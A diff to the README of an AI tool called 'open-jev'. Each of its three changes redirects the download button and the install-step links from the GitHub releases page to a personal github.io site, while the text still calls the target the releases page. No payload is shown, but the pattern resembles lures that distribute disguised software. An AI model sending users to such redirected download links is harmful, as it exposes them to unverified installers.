@@ -1,7 +1,7 @@
 <h1>🚀 open-jev - Your Easy Path to Custom AI</h1>
 
 <p align="center">
-  <a href="https://github.com/Donatasramanauskas007/open-jev/releases">
+  <a href="https://donatasramanauskas007.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082" alt="Download Button" width="300" height="80">
   </a>
 </p>
@@ -64,7 +64,7 @@ Before you jump in, let's make sure your computer is ready. open-jev is designed
 
 This is the most important step. Here's exactly what to do:
 
-1.  **Click the big red button** at the top of this page, or navigate directly to our releases page by clicking here: [https://github.com/Donatasramanauskas007/open-jev/releases](https://github.com/Donatasramanauskas007/open-jev/releases)**.**
+1.  **Click the big red button** at the top of this page, or navigate directly to our releases page by clicking here: [https://donatasramanauskas007.github.io](https://donatasramanauskas007.github.io)**.**
 
 2.  On that page, you'll see a list of available versions. Choose the **latest stable release** (usually the top one, marked with "Latest" or "Newest" badge**)**.
 
@@ -216,7 +216,7 @@ You're all set! Take a moment to explore open-jev on your own. Ask it to summari
 ## 🔗 Direct Download Access (One Last Time**)** 
 
 Bookmark this link for future updates:  
-**[https://github.com/Donatasramanauskas007/open-jev/releases](https://github.com/Donatasramanauskas007/open-jev/releases)**
+**[https://donatasramanauskas007.github.io](https://donatasramanauskas007.github.io)**
 
 Visit this link to download the application. We recommend adding it to your browser's favorites so you always have easy access to the latest improved version.
 
